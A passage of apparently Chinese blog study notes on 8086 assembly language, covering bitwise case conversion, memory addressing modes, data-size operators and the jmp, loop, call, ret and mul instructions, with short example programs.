al,11110111B</p><p>若要将一个操作对象的某一位设置成1，则用or指令，例如：将al第5位设置成1：or al,00100000B</p></blockquote><h2 id="大小写转化问题"><a class="markdownIt-Anchor" href="#大小写转化问题"></a> 大小写转化问题</h2><p>为了更深刻地理解and和or指令，考虑如何将一个字符串变成全大写或者全小写。</p><p>从一个字母的ASCII码的二进制来看，它的第5位如果是0，则这个字母为大写，如果为1，则为小写。</p><p>思路就是：</p><p>将一个字母与一个二进制进行and或or运算，强制改变第5位。</p><p>看看汇编代码：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line"></span><br><span class="line">datasg segment</span><br><span class="line">    db 'AbcDE'</span><br><span class="line">    db 'aBCDe'</span><br><span class="line">datasg ends</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line">start: mov ax,datasg</span><br><span class="line">       mov ds,ax           ;设置ds指向datasg段</span><br><span class="line">       mov bx,0            ;设置(bx)=0，ds:bx指向'AbcDE'的第一个字母</span><br><span class="line">       mov cx,5            ;5个字母，循环5次</span><br><span class="line">    s1:mov al,[bx]         ;将ASCII码从ds:bx所指向的单元中取出</span><br><span class="line">       and al,11011111B    ;将al中的ASCII码的第5个位置为0，变为大写字母</span><br><span class="line">       mov [bx],al         ;将转变后的ASCII码写回原单元</span><br><span class="line">       inc bx              ;(bx)++，ds:bx指向下一个字母</span><br><span class="line">       loop s1</span><br><span class="line">       </span><br><span class="line">       mov bx,5            ;设置(bx)=5，ds:bx指向'aBCDe'的第一个字母</span><br><span class="line">       mov cx,5</span><br><span class="line">    s2:mov al,[bx]</span><br><span class="line">       or al,00100000B     ;将al中的ASCII码的第5个位置为1，变为小写字母</span><br><span class="line">       mov [bx],al</span><br><span class="line">       inc bx</span><br><span class="line">       loop s2</span><br><span class="line">       </span><br><span class="line">       mov ax,4c00h</span><br><span class="line">       int 21h</span><br><span class="line">       </span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></tbody></table></figure><h2 id="bxidata"><a class="markdownIt-Anchor" href="#bxidata"></a> [bx+idata]</h2><p>前面我们用[bx]的方式来指明一个内存单元，还可以用更灵活的方式来指明内存单元：[bx+idata]表示一个内存单元，它的偏移地址的(bx)+idata(bx中的数值加上idata)。</p><p>例如：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx+200]</span><br></pre></td></tr></tbody></table></figure><p>这行指令的含义为：</p><p>将一个内存单元的内容送入ax，这个内存单元的长度为2个字节，存放一个字，偏移地址为bx中的数值再加上200，段地址在ds中。</p><p>数学化的描述为：</p><p>(ax)=((ds)*16+(bx)+200)</p><p>上述指令也可以写成：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[200+bx]</span><br><span class="line">mov ax,200[bx]</span><br><span class="line">mov ax,[bx].200</span><br></pre></td></tr></tbody></table></figure><h2 id="用bxidata的方式处理数组"><a class="markdownIt-Anchor" href="#用bxidata的方式处理数组"></a> 用[bx+idata]的方式处理数组</h2><p>两种形式：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[bx]=0[bx]</span><br><span class="line"></span><br><span class="line">[bx+5]=5[bx]</span><br></pre></td></tr></tbody></table></figure><h2 id="si和di"><a class="markdownIt-Anchor" href="#si和di"></a> SI和DI</h2><p>si和di是8086CPU中和bx功能相近的寄存器，si和di不能够分成两个8位寄存器来使用</p><h2 id="bxsi和bxdi"><a class="markdownIt-Anchor" href="#bxsi和bxdi"></a> [bx+si]和[bx+di]</h2><p>前面我们用[bx]和[bx+idata]的方式来指明一个内存单元，我们还可以用更灵活的方式：[bx+si]和[bx+di]</p><p>例如：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx+si]</span><br></pre></td></tr></tbody></table></figure><p>含义如下：</p><p>将一个内存单元的内容送入ax，这个内存单元的长度为2个字节，存放一个字，偏移地址为bx中的数值加上si中的数值，段地址在ds中。</p><p>数学化的描述：</p><p>(ax)=((ds)*16+(bx)+(si))</p><p>该指令另外一种常用的表示方法：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx][si]</span><br></pre></td></tr></tbody></table></figure><h2 id="bxsiidata和bxdiidata"><a class="markdownIt-Anchor" href="#bxsiidata和bxdiidata"></a> [bx+si+idata]和[bx+di+idata]</h2><p>这是一种更加灵活的方式：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx+si+idata]</span><br></pre></td></tr></tbody></table></figure><p>含义如下：</p><p>将一个内存单元的内容送入ax，这个内存单元的长度为2个字节，存放一个字，偏移地址为bx中的数值加上si中的数值再加上idata，段地址在ds中。</p><p>数学化的描述：</p><p>(ax)=((ds)*16+(bx)+(si)+idata)</p><p>该指令另外一种常用的表示方法：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx+200+si]</span><br><span class="line">mov ax,[200+bx+si]</span><br><span class="line">mov ax,200[bx][si]</span><br><span class="line">mov ax,[bx].200[si]</span><br><span class="line">mov ax,[bx][si].200</span><br></pre></td></tr></tbody></table></figure><h2 id="不同的寻址方式的灵活运用"><a class="markdownIt-Anchor" href="#不同的寻址方式的灵活运用"></a> 不同的寻址方式的灵活运用</h2><p>通过比较前面用到过的寻址方法，可以发现：</p><blockquote><p>1、[idata]用一个常量来表示地址，可用于直接定位一个内存单元。</p><p>2、[bx]用一个变量来表示内存单元地址，可用于间接定位一个内存单元。</p><p>3、[bx+idata]用一个变量和一个常量来表示地址，可在一个起始地址的基础上用变量间接定位一个内存单元。</p><p>4、[bx+si]用两个变量表示地址。</p><p>5、[bx+si+idata]用两个变量和一个常量表示地址。</p></blockquote><p>不同寻址方式各有利弊，根据实际情况而定。</p><h1 id="数据处理的两个基本问题"><a class="markdownIt-Anchor" href="#数据处理的两个基本问题"></a> 数据处理的两个基本问题</h1><p>在这里定义两个描述性符号：<strong>reg</strong>和<strong>sreg</strong></p><p><strong>reg</strong>的集合包括：<strong>ax、bx、cx、dx、ah、al、bh、bl、ch、cl、dh、dl、sp、bp、si、di</strong></p><p><strong>sreg</strong>的集合包括：<strong>ds、ss、cs、es</strong></p><h2 id="bx-si-di和bp"><a class="markdownIt-Anchor" href="#bx-si-di和bp"></a> bx、si、di和bp</h2><p>1、在8086CPU中，只有bx、si、di和bp这4个寄存器可以用在"[…]"中来进行内存单元的寻址。</p><p>2、在[…]中，这4个寄存器可以单个出现，或者只能以4中组合出现：bx和si、bx和di，bp和si，bp和di。</p><p>例如：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">;正确用法：</span><br><span class="line">mov ax,[bx]</span><br><span class="line">mov ax,[si]</span><br><span class="line">mov ax,[di]</span><br><span class="line">mov ax,[bp]</span><br><span class="line">mov ax,[bx+si]</span><br><span class="line">mov ax,[bx+di]</span><br><span class="line">mov ax,[bp+si]</span><br><span class="line">mov ax,[bp+di]</span><br><span class="line">mov ax,[bx+si+idata]</span><br><span class="line">mov ax,[bx+di+idata]</span><br><span class="line">mov ax,[bp+si+idata]</span><br><span class="line">mov ax,[bp+di+idata]</span><br><span class="line"></span><br><span class="line">;错误用法：</span><br><span class="line">mov ax,[bx+bp]</span><br><span class="line">mov ax,[si+di]</span><br></pre></td></tr></tbody></table></figure><p>3、只要在[…]中使用寄存器bp，而指令中没有显性地给出段地址，段地址就默认在ss中。</p><p>例如：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bp]          ;含义：(ax)=((ss)*16+(bp))</span><br><span class="line">mov ax,[bp+idata]    ;含义：(ax)=((ss)*16+(bp)+idata)</span><br><span class="line">mov ax,[bp+si]       ;含义：(ax)=((ss)*16+(bp)+(si))</span><br><span class="line">mov ax,[bp+si+idata] ;含义：(ax)=((ss)*16+(bp)+(si)+idata)</span><br></pre></td></tr></tbody></table></figure><h2 id="机器指令处理的数据在什么地方"><a class="markdownIt-Anchor" href="#机器指令处理的数据在什么地方"></a> 机器指令处理的数据在什么地方</h2><table><thead><tr><th>机器码</th><th>汇编指令</th><th>指令执行前数据的位置</th></tr></thead><tbody><tr><td>8E1E0000</td><td>mov bx,[0]</td><td>内存，ds:0单元</td></tr><tr><td>89C3</td><td>mov bx,ax</td><td>CPU内部，ax寄存器</td></tr><tr><td>BB0100</td><td>mov bx,1</td><td>CPU内部，指令缓冲器</td></tr></tbody></table><h2 id="汇编语言中数据位置的表达"><a class="markdownIt-Anchor" href="#汇编语言中数据位置的表达"></a> 汇编语言中数据位置的表达</h2><p>1、立即数(idata)</p><p>对于直接包含在机器指令中的数据，在汇编语言中称为：立即数。</p><p>2、寄存器</p><p>指令要处理的数据在寄存器中，在汇编指令中给出相应的寄存器名。</p><p>3、段地址SA偏移地址(EA)</p><p>指令要处理的数据在内存中，在汇编指令中可用[X]的格式给出EA，SA在某个段寄存器中。</p><p>● 存放段地址的寄存器可以是默认的，例如：</p><p>(1)段地址默认在ds中：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[0]</span><br><span class="line">mov ax,[di]</span><br><span class="line">mov ax,[bx+8]</span><br><span class="line">mov ax,[bx+si]</span><br><span class="line">mov ax,[bx+si+8]</span><br></pre></td></tr></tbody></table></figure><p>(2)段地址默认在ss中：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bp]</span><br><span class="line">mov ax,[bp+8]</span><br><span class="line">mov ax,[bp+si]</span><br><span class="line">mov ax,[bp+si+8]</span><br></pre></td></tr></tbody></table></figure><p>● 存放段地址的寄存器也可以是显性给出的，例如：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,ds:[bp]       ;含义：(ax)=((ds)*16+(bp))  </span><br><span class="line">mov ax,es:[bx]       ;含义：(ax)=((es)*16+(bx))  </span><br><span class="line">mov ax,ss:[bx+si]    ;含义：(ax)=((ss)*16+(bx)+(si))  </span><br><span class="line">mov ax,cs:[bx+si+8]  ;含义：(ax)=((cs)*16+(bx)+(si)+8)</span><br></pre></td></tr></tbody></table></figure><h2 id="寻址方式"><a class="markdownIt-Anchor" href="#寻址方式"></a> 寻址方式</h2><p>1、直接寻址</p><table><thead><tr><th style="text-align:center">寻址方式</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">[idata]</td><td style="text-align:center">EA=idata，SA=(ds)</td></tr></tbody></table><p>常用格式：[idata]</p><p>2、寄存器间接寻址</p><table><thead><tr><th style="text-align:center">寻址方式</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">[bx]</td><td style="text-align:center">EA=(bx),SA=(ds)</td></tr><tr><td style="text-align:center">[si]</td><td style="text-align:center">EA=(si),SA=(ds)</td></tr><tr><td style="text-align:center">[di]</td><td style="text-align:center">EA=(di),SA=(ds)</td></tr><tr><td style="text-align:center">[bp]</td><td style="text-align:center">EA=(bp),SA=(ss)</td></tr></tbody></table><p>常用格式：[bx]</p><p>3、寄存器相对寻址</p><table><thead><tr><th style="text-align:center">寻址方式</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">[bx+idata]</td><td style="text-align:center">EA=(bx)+idata,SA=(ds)</td></tr><tr><td style="text-align:center">[si+idata]</td><td style="text-align:center">EA=(si)+idata,SA=(ds)</td></tr><tr><td style="text-align:center">[di+idata]</td><td style="text-align:center">EA=(di)+idata,SA=(ds)</td></tr><tr><td style="text-align:center">[bp+idata]</td><td style="text-align:center">EA=(bp)+idata,SA=(ss)</td></tr></tbody></table><p>常用格式：</p><p>● 用于结构体：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[bx].idata</span><br></pre></td></tr></tbody></table></figure><p>● 用于数组：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idata[si],idata[di]</span><br></pre></td></tr></tbody></table></figure><p>● 用于二维数组：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[bx][idata]</span><br></pre></td></tr></tbody></table></figure><p>4、基址变址寻址</p><table><thead><tr><th style="text-align:center">寻址方式</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">[bx+si]</td><td style="text-align:center">EA=(bx)+(si),SA=(ds)</td></tr><tr><td style="text-align:center">[bx+di]</td><td style="text-align:center">EA=(bx)+(di),SA=(ds)</td></tr><tr><td style="text-align:center">[bp+si]</td><td style="text-align:center">EA=(bp)+(si),SA=(ss)</td></tr><tr><td style="text-align:center">[bp+di]</td><td style="text-align:center">EA=(bp)+(di),SA=(ss)</td></tr></tbody></table><p>常用格式：</p><p>用于二维数组：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[bx][si]</span><br></pre></td></tr></tbody></table></figure><p>5、相对基址变址寻址</p><table><thead><tr><th style="text-align:center">寻址方式</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">[bx+si+idata]</td><td style="text-align:center">EA=(bx)+(si)+idata,SA=(ds)</td></tr><tr><td style="text-align:center">[bx+di+idata]</td><td style="text-align:center">EA=(bx)+(di)+idata,SA=(ds)</td></tr><tr><td style="text-align:center">[bp+si+idata]</td><td style="text-align:center">EA=(bp)+(si)+idata,SA=(ss)</td></tr><tr><td style="text-align:center">[bp+di+idata]</td><td style="text-align:center">EA=(bp)+(di)+idata,SA=(ss)</td></tr></tbody></table><p>常用格式：</p><p>用于表格(结构)中的数组项：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[bx].idata[si]</span><br></pre></td></tr></tbody></table></figure><p>用于二维数组：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idata[bx][si]</span><br></pre></td></tr></tbody></table></figure><h2 id="指令处理的数据"><a class="markdownIt-Anchor" href="#指令处理的数据"></a> 指令处理的数据</h2><p>8086CPU的指令，可以处理两种尺寸的数据，byte和word，所以在机器指令中要指明，指令进行的是字操作还是字节操作。汇编语言用以下方法处理：</p><p>1、通过寄存器名指明要处理的数据的尺寸</p><p>2、没有寄存器名存在的情况下，用操作符X ptr指明内存单元的长度，X可以为word或者byte，例如：</p><p>● 用word ptr指明访问的内存单元是一个字单元，例如：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov word ptr ds:[0],1</span><br><span class="line">inc word ptr [bx]</span><br></pre></td></tr></tbody></table></figure><p>● 用byte ptr指明访问的内存单元是一个字节单元，例如：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov byte ptr ds:[0],1</span><br><span class="line">inc byte ptr [bx]</span><br></pre></td></tr></tbody></table></figure><p>3、其他方法</p><p>有些指令默认了访问的是字单元还是字节单元，比如，push [1000H]就不用指明访问的是字单元还是字节单元，因为push指令只进行字操作</p><h2 id="dup"><a class="markdownIt-Anchor" href="#dup"></a> dup</h2><p>dup是一个操作符，在汇编语言中和db、dd、dw等数据定义伪指令配合使用，用来进行数据的重复，例如：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db 3 dup (0)</span><br><span class="line">db 0,0,0</span><br></pre></td></tr></tbody></table></figure><p>定义3个字节，这两个是等价的；又如：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db 3 dup (0,1,2)</span><br><span class="line">db 0,1,2,0,1,2,0,1,2</span><br></pre></td></tr></tbody></table></figure><p>定义了9个字节</p><blockquote><p>dup的使用格式如下：</p><p>db 重复的次数 dup （重复的字节型数据）</p><p>dw 重复的次数 dup（重复的字型数据）</p><p>dd 重复的次数 dup（重复的双字型数据）</p></blockquote><h1 id="转移指令"><a class="markdownIt-Anchor" href="#转移指令"></a> 转移指令</h1><p>8086CPU的转移行为有以下几类</p><p>● 只修改IP时，称为段内转移，比如：jmp ax</p><p>● 同时修改CS和IP时，称为段间转移，比如：jmp 1000:0</p><p>由于转移指令对IP的修改范围不同，段内转移又分为：短转移和近转移</p><p>● 短转移IP的修改范围为-128~127</p><p>● 近转移IP的修改范围为-32768~32767</p><p>8086CPU的转移指令分为以下几类：</p><p>● 无条件转移指令（如：jmp）</p><p>● 条件转移指令</p><p>● 循环指令（如：loop）</p><p>● 过程</p><p>● 中断</p><h2 id="操作符offset"><a class="markdownIt-Anchor" href="#操作符offset"></a> 操作符offset</h2><p>操作符offset在汇编语言中是由编译器处理的符号，它的功能是取得标号的偏移地址。</p><p>例如：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">    start: mov ax,offset start ;相当于mov ax,0</span><br><span class="line">    </span><br><span class="line">codesg ends</span><br><span class="line">end</span><br></pre></td></tr></tbody></table></figure><p>说明：</p><p>上面的程序中，offset操作符取得了标号start的偏移地址，start是代码段的标号，所标记的指令时代码段的第一条指令，偏移地址为0。</p><h2 id="jmp指令"><a class="markdownIt-Anchor" href="#jmp指令"></a> jmp指令</h2><p>jmp为无条件转移指令，可以只修改IP，也可以同时修改CS和IP。</p><p>jmp指令要给出两种信息：</p><p>1、转移的目的地址</p><p>2、转移的距离（段间转移、段内短转移、段内近转移）</p><p>格式如下：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jmp short 标号     ;段内短转移</span><br><span class="line">jmp far ptr 标号   ;段间转移(远转移)</span><br><span class="line">jmp 16位reg        ;(IP)=(16位reg)</span><br></pre></td></tr></tbody></table></figure><h2 id="转移地址在内存中的jmp指令"><a class="markdownIt-Anchor" href="#转移地址在内存中的jmp指令"></a> 转移地址在内存中的jmp指令</h2><p>转移地址在内存中的jmp指令有2中格式：</p><p>1、jmp word ptr 内存单元地址(段内转移)</p><p>功能：从内存单元地址处开始存放着一个字，是转移的目的偏移地址。</p><p>2、jmp dword ptr 内存单元地址(段间转移)</p><p>功能：从内存单元地址处开始存放着两个字，高地址处的字是转移的目的段地址，低地址处是转移的目的偏移地址。</p><h2 id="jcxz指令"><a class="markdownIt-Anchor" href="#jcxz指令"></a> jcxz指令</h2><p>jcxz指令为有条件转移指令，所有的有条件转移指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为-128~127。</p><p>指令格式： jcxz 标号 (如果(cx)=0，转移到标号处执行)</p><p>操作：</p><p>1、当(cx)=0时，(IP)=(IP)+8位位移</p><blockquote><p>8位位移=标号处的地址-jcxz指令后的第一个字节的地址</p><p>8位位移的范围为-128~127，用补码表示</p><p>8位位移由编译程序在编译时算出</p></blockquote><p>2、当(cx)≠0时，什么也不做，程序向下执行</p><p>我们从jcxz的功能中可以看出，jcxz功能相当于：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if((cx)==0) jmp short 标号;</span><br></pre></td></tr></tbody></table></figure><h2 id="loop指令-2"><a class="markdownIt-Anchor" href="#loop指令-2"></a> loop指令</h2><p>loop指令为循环指令，所有的循环指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为-128~127。</p><p>指令格式：loop 标号 ((cx)=(cx)-1，如果(cx)≠0，转移到标号处执行)</p><p>操作：</p><p>1、(cx)=(cx)-1</p><p>2、</p><p>● 如果(cx)≠0，(IP)=(IP)+8位位移</p><blockquote><p>8位位移=标号处的地址-loop指令后的第一个字节的地址</p><p>8位位移的范围为-128~127，用补码表示</p><p>8位位移由编译程序在编译时算出</p></blockquote><p>● 如果(cx)=0，什么也不做，程序向下执行</p><p>我们从loop的功能中可以看出，loop功能相当于：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(cx)--;</span><br><span class="line">if((cx)≠0) jmp short 标号;</span><br></pre></td></tr></tbody></table></figure><h1 id="call和ret指令"><a class="markdownIt-Anchor" href="#call和ret指令"></a> CALL和RET指令</h1><h2 id="ret和retf"><a class="markdownIt-Anchor" href="#ret和retf"></a> ret和retf</h2><p>ret指令用栈中的数据，修改IP的内容，从而实现近转移</p><p>retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移</p><p>1、CPU执行ret指令时，进行下面2步操作：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、(IP)=((ss)*16+(sp))</span><br><span class="line">2、(sp)=(sp)+2</span><br></pre></td></tr></tbody></table></figure><p>2、CPU执行retf指令时，进行下面4步操作：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、(IP)=((ss)*16+sp)</span><br><span class="line">2、(sp)=(sp)+2</span><br><span class="line">3、(CS)=((ss)*16+sp)</span><br><span class="line">4、(sp)=(sp)+2</span><br></pre></td></tr></tbody></table></figure><p>可以看出，如果我们用汇编语法来解释ret和retf指令，则：</p><p>● CPU执行ret指令时，相当于进行：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop IP</span><br></pre></td></tr></tbody></table></figure><p>● CPU执行retf指令时，相当于进行：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop IP</span><br><span class="line">pop CS</span><br></pre></td></tr></tbody></table></figure><h2 id="call"><a class="markdownIt-Anchor" href="#call"></a> call</h2><p>CPU执行call指令时，进行两步操作：</p><p>1、将当前的IP或CS和IP压入栈中</p><p>2、转移</p><blockquote><p>call指令不能实现短转移，call指令实现转移的方法和jmp指令的原理相同。</p></blockquote><h2 id="call指令的主要应用格式"><a class="markdownIt-Anchor" href="#call指令的主要应用格式"></a> call指令的主要应用格式</h2><h3 id="依据位移进行转移的call指令"><a class="markdownIt-Anchor" href="#依据位移进行转移的call指令"></a> 依据位移进行转移的call指令</h3><p>call 标号（将当前的IP压入栈中，转到标号处执行指令）</p><p>CPU执行call指令，进行以下操作：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、(sp)=(sp)-2</span><br><span class="line">   ((ss)*16+(sp)=(IP))</span><br><span class="line">2、(IP)=(IP)+16位位移</span><br></pre></td></tr></tbody></table></figure><p>CPU执行"call 标号"时，相当于进行：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp near ptr 标号</span><br></pre></td></tr></tbody></table></figure><h3 id="转移目的地址在指令中的call指令"><a class="markdownIt-Anchor" href="#转移目的地址在指令中的call指令"></a> 转移目的地址在指令中的call指令</h3><p>call far ptr 标号 （段间转移）</p><p>CPU执行这种格式的cal指令时，进行以下操作：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、(sp)=(sp)-2</span><br><span class="line">   ((ss)*16+(sp))=(CS)</span><br><span class="line">   (sp)=(sp)-2</span><br><span class="line">   ((ss)*16+(sp))=(IP)</span><br><span class="line">2、(CS)=标号所在段的段地址</span><br><span class="line">   (IP)=标号在段中的偏移地址</span><br></pre></td></tr></tbody></table></figure><p>CPU执行"call far ptr 标号"时，相当于进行：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push CS</span><br><span class="line">push IP</span><br><span class="line">jmp far ptr 标号</span><br></pre></td></tr></tbody></table></figure><h3 id="转移地址在寄存器中的call指令"><a class="markdownIt-Anchor" href="#转移地址在寄存器中的call指令"></a> 转移地址在寄存器中的call指令</h3><p>指令格式：call 16位reg</p><p>功能：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(sp)=(sp)-2</span><br><span class="line">((ss)*16+(sp))=(IP)</span><br><span class="line">(IP)=(16位reg)</span><br></pre></td></tr></tbody></table></figure><p>CPU执行"call 16位reg"时，相当于进行：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp 16位reg</span><br></pre></td></tr></tbody></table></figure><h3 id="转移地址在内存中的call指令"><a class="markdownIt-Anchor" href="#转移地址在内存中的call指令"></a> 转移地址在内存中的call指令</h3><p>转移地址在内存中的call指令有2种格式</p><p>1、call word ptr 内存单元地址</p><p>CPU执行"call word ptr 内存单元地址"时，相当于进行：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp word ptr 内存单元地址</span><br></pre></td></tr></tbody></table></figure><p>2、call dword ptr 内存单元地址</p><p>CPU执行"call dword ptr 内存单元地址"时，相当于进行：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push CS</span><br><span class="line">push IP</span><br><span class="line">jmp dword ptr 内存单元地址</span><br></pre></td></tr></tbody></table></figure><h2 id="mul和div指令"><a class="markdownIt-Anchor" href="#mul和div指令"></a> mul和div指令</h2><h3 id="mul"><a class="markdownIt-Anchor" href="#mul"></a> mul</h3><p>mul是乘法指令，使用mul做乘法得到时候，需要注意：</p><p>1、两个相乘的数，要么都是8位，要么都是16位。如果是8位，一个默认放在AL中，另一个放在8位reg或内存字节单元中；如果是16位，一个默认放在AX中，另一个放在16位reg或内存单元中。</p><p>2、如果是8位乘法，结果默认放在AX中；如果是16位乘法，结果高位默认在DX中存放，低位在AX中存放。</p><p>格式：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mul reg</span><br><span class="line">mul 内存单元</span><br></pre></td></tr></tbody></table></figure><h3 id="div"><a class="markdownIt-Anchor" href="#div"></a> 